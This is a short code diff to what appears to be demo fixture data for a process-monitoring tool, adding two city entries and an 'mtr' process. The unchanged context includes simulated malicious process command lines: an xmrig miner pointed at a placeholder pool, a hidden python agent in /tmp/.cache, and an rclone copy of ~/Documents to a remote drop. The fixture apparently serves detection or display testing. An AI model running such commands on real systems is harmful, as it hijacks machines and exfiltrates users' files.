@@ -19,6 +19,8 @@ export const CITIES = {
   ashburn: city('Ashburn', 'Virginia', 'US', 'United States', 39.0438, -77.4874),
   kc: city('Kansas City', 'Missouri', 'US', 'United States', 39.0997, -94.5786),
   toronto: city('Toronto', 'Ontario', 'CA', 'Canada', 43.6532, -79.3832),
+  newyork: city('New York', 'New York', 'US', 'United States', 40.7128, -74.006),
+  chicago: city('Chicago', 'Illinois', 'US', 'United States', 41.8781, -87.6298),
   saopaulo: city('São Paulo', 'São Paulo', 'BR', 'Brazil', -23.5505, -46.6333),
   dublin: city('Dublin', 'Leinster', 'IE', 'Ireland', 53.3498, -6.2603),
   london: city('London', 'England', 'GB', 'United Kingdom', 51.5072, -0.1276),
@@ -166,6 +168,7 @@ export const PROCS = {
   python: { pid: 9182, name: 'python3', exe: '/usr/bin/python3.14', cmd: 'python3 /tmp/.cache/.x/agent.py --quiet', user: 'demo', unit: 'session-2.scope' },
   xmrig: { pid: 13377, name: 'xmrig', exe: '/tmp/.cache/xmrig', cmd: '/tmp/.cache/xmrig --donate-level 0 -o pool.hashfall.example:3333', user: 'demo', unit: 'session-2.scope' },
   rclone: { pid: 14002, name: 'rclone', exe: '/usr/bin/rclone', cmd: 'rclone copy ~/Documents dropzone:backup', user: 'demo', unit: 'session-2.scope' },
+  mtr: { pid: 16100, name: 'mtr', exe: '/usr/bin/mtr', cmd: 'mtr api.anthropic.com', user: 'demo', unit: 'app-hyprland-kitty-7300.scope' },
   tor: { pid: 15010, name: 'tor', exe: '/usr/bin/tor', cmd: '/usr/bin/tor -f /etc/tor/torrc', user: 'tor', unit: 'tor.service' },
 };
 
